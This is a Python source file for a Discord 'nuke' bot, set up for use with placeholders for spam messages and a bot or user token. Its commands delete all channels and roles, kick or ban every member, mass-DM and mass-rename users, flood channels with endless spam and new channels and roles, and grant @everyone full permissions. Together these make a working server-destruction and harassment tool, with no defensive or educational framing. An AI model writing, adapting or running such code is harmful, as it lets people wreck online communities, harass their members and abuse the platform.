import discord
from discord.ext.commands import *
from discord.ext import commands
import random
import asyncio
import time
import json
from itertools import cycle
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get
from discord import Permissions

ROLE_COLORS = ['9eff00', '5d00ff', '1e00ff', '00ff00']

#put the random choice channel names in the parenthesis, followed by a comma. Example - ["Your server has been nuked", "Get nuked"]
CHANNEL_NAMES = []
#put the random choice spam messages in the parenthesis, followed by a comma. Example - ["@everyone Your server has been nuked", "@everyone Get nuked"]
MESSAGE_CONTENTS = []

#replace the $ with a prefix of choice.
bot = commands.Bot(command_prefix='$')

client = commands.Bot(command_prefix='$')

bot.remove_command('help')


@bot.event
async def on_ready():
    #add a status here.
    game = discord.Game("")
    await bot.change_presence(status=discord.Status.online, activity=game)
    print("Bot is ready.")

@bot.command()
async def help(ctx):
 embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)

 embed.set_author(name="Help", icon_url=ctx.author.avatar_url)
 
 embed.add_field(name="help", value="shows this message.", inline=False)
 embed.add_field(name="serverkill", value="Kills the server.", inline=False)
 embed.add_field(name="nick <nickname>", value="Mass nickname change", inline=False)
 embed.add_field(name="message <message>", value="Dms everyone.", inline=False)
 embed.add_field(name="spamall", value="Spams all channels.", inline=False)
 embed.add_field(name="spamchannel", value="Spams the channel.", inline=False)
 embed.add_field(name="role", value="Creates a role.", inline=False)
 embed.add_field(name="role2", value="Spams roles.", inline=False)
 embed.add_field(name="delete", value="Deletes all channels.", inline=False)
 embed.add_field(name="channels", value="Creates channels.", inline=False)
 embed.add_field(name="Kick <user>", value="Kicks the user.", inline=False)
 embed.add_field(name="ban", value="Bans all users.", inline=False)
 embed.add_field(name="ban2 <user>", value="Bans specified user..", inline=False)
 embed.add_field(name="purge <amount>", value="Purges messages.", inline=False)
 embed.add_field(name="permissions", value="Gives everyone permissions.", inline=False)

 await ctx.send(embed=embed)


@bot.command(pass_context=True)
async def nick(ctx, rename_to):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print (f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
            except:
                print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
        print ("Action Completed: change nick")

@bot.command(pass_context=True)
async def ban2(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()

@bot.command(pass_context=True)
async def role(ctx, amount=50):
    await ctx.message.delete()
    guild = ctx.guild
    role = await guild.create_role(name="oof.")
    while True:
        await role.edit(color=discord.Color(0xe74c3c))
        await asyncio.sleep(1000)

@bot.command(pass_context=True)
async def kick(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print ("Action Completed: Kicked")  

@bot.command(pass_context=True)
async def message(ctx, *, message):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"{user.name} has recieved the message.")
            except:
                print(f"{user.name} has NOT recieved the message.")
        print("Action Completed: Message")

@bot.command(pass_context=True)
async def serverkill(ctx, amount=100):
        await ctx.message.delete()
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print (f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
        for user in list(ctx.guild.members):
            try:         
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
                guild = ctx.message.guild 
        for i in range(amount):
           await guild.create_text_channel(random.choice(CHANNEL_NAMES))
        print ("nuked server successfully!")
        

@bot.command(pass_context=True)
async def ban(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print ("Action Completed: Banned")  

@bot.command()
async def clear(ctx, amount=100000):
    await ctx.channel.purge(limit=amount)

#WARNING this command will rate limit the bot
@bot.command(pass_context=True)
async def role2(ctx): 
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name=random.choice(CHANNEL_NAMES), color=discord.Color(0xe74c3c))


@bot.command(pass_context=True)
async def spamchannel(ctx): 
    await ctx.message.delete()
    while True:
    
     await ctx.send(random.choice(MESSAGE_CONTENTS))


@bot.command(pass_context=True)
async def spamall(ctx, amount=100000):
    await ctx.message.delete()
    if not amount is None:
        for _ in range(amount):
            for channel in ctx.guild.text_channels:
              await channel.send(random.choice(MESSAGE_CONTENTS))
    else:
        while True:  
            for channel in ctx.guild.text_channels:      
              await channel.send(random.choice(MESSAGE_CONTENTS))

 
@bot.command(pass_context=True)
async def ping(ctx):
  await ctx.message.delete()
  await ctx.send("Online and ready to go")
  print ("Online")                    

@bot.command(pass_context=True)
async def delete(ctx):
  await ctx.message.delete()
  for channel in ctx.guild.channels:
    print(f"Deleting channel {channel.name}")
    await channel.delete()

@bot.command(pass_context=True)
async def channels(ctx, amount=100000):
    await ctx.message.delete()
    guild = ctx.message.guild 
    for i in range(amount):
        await guild.create_text_channel(random.choice(CHANNEL_NAMES))

@bot.command(pass_context=True)
async def permissions(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f"All permissions have been given in {ctx.guild.name}") 
                  except:
                      print(f"Permissions have failed to be given in {ctx.guild.name}")
 

#replace the words token here with your bot's token. If you wish to use a user token, add a comma after the quotation marks and add bot = False.
bot.run("token here")
